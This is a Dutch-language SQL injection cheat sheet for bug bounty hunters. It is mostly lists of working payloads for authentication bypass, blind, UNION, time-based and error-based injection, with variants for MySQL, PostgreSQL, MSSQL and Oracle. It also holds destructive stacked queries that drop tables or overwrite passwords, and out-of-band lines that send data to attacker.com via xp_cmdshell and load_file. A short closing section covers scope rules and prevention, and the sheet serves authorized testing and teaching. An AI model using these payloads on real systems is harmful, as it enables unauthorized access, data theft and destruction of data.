
# SQL Injection Cheat Sheet

Bug Bounty Referentiegids voor Ethische Hackers

**⚠️ Belangrijk:** Deze payloads zijn alleen bedoeld voor geautoriseerde penetratietesten en bug bounty programma's. Gebruik deze informatie alleen op systemen waarvoor je expliciete toestemming hebt.

## Basis SQL Injection Payloads

### Authenticatie Bypass

- ' OR '1'='1
- ' OR 1=1--
- ' OR 1=1#
- ' OR 1=1/*
- admin' --
- admin' #
- admin'/*
- ' or 1=1--
- ') or '1'='1--
- ') or ('1'='1--

### Boolean-based Blind SQL Injection

- ' AND '1'='1
- ' AND '1'='2
- 1' AND '1'='1
- 1' AND '1'='2

### UNION-based SQL Injection

- ' UNION SELECT NULL--
- ' UNION SELECT NULL,NULL--
- ' UNION SELECT NULL,NULL,NULL--
- ' UNION ALL SELECT NULL--
- ' UNION SELECT 1,2,3--
- ' UNION SELECT table_name,NULL FROM information_schema.tables--
- ' UNION SELECT column_name,NULL FROM information_schema.columns--

### Time-based Blind SQL Injection

- ' OR SLEEP(5)--
- ' OR BENCHMARK(10000000,MD5('A'))--
- '; WAITFOR DELAY '0:0:5'-- (MSSQL)
- ' OR pg_sleep(5)-- (PostgreSQL)

### Error-based SQL Injection

- '
- ''
- "
- ""
- ')
- '))
- ';
- " OR 1=1--

### Stacked Queries

- '; DROP TABLE users--
- '; INSERT INTO users VALUES('hacker','pass')--
- '; UPDATE users SET password='hacked'--

## Database Specifieke Payloads

### MySQL

- ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
- ' AND 1=0 UNION ALL SELECT NULL, concat(table_name) FROM information_schema.tables--
- ' UNION SELECT @@version--
- ' UNION SELECT user()--
- ' UNION SELECT database()--

### PostgreSQL

- ' UNION SELECT version()--
- ' UNION SELECT current_database()--

### Microsoft SQL Server (MSSQL)

- ' UNION SELECT @@version--
- ' UNION SELECT DB_NAME()--
- ' UNION SELECT name FROM sys.databases--

### Oracle

- ' UNION SELECT banner FROM v$version--
- ' UNION SELECT NULL FROM dual--

## Geavanceerde Technieken

### Out-of-band SQL Injection

- '; EXEC xp_cmdshell('nslookup attacker.com')-- (MSSQL)
- ' UNION SELECT load_file(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\'))--

### Encoding/Obfuscation

- %27 OR 1=1-- (URL encoded)
- ' OR 1=1-- (HTML encoded)
- \' OR 1=1-- (Escaped)
- %2527 OR 1=1-- (Double encoded)

## Bug Bounty Best Practices

- **Blijf binnen scope:** Controleer altijd het bug bounty programma en de toegestane test targets
- **Read-only queries:** Gebruik geen destructieve commando's zoals DROP, DELETE, of UPDATE
- **Test accounts:** Maak je eigen test accounts aan en test daarop
- **Documentatie:** Maak screenshots en beschrijf duidelijk de steps to reproduce
- **Direct rapporteren:** Meld kwetsbaarheden onmiddellijk volgens het disclosure beleid
- **Aanbevolen tools:**
    - SQLMap (geautomatiseerde SQL injection tool)
    - Burp Suite (web application security testing)
    - OWASP ZAP (penetration testing tool)

**💡 Tip:** Begin altijd met simpele payloads en werk naar complexere technieken. Veel applicaties zijn al kwetsbaar voor basis SQL injection.

## Preventie Technieken

**Als developer, bescherm tegen SQL injection met:**

- **Prepared Statements:** Gebruik parameterized queries
- **Input Validatie:** Whitelist toegestane karakters en valideer datatypes
- **Stored Procedures:** Met juiste parameterisatie
- **ORM Frameworks:** Met proper escaping
- **Least Privilege:** Database users minimale rechten geven
- **WAF:** Web Application Firewall implementeren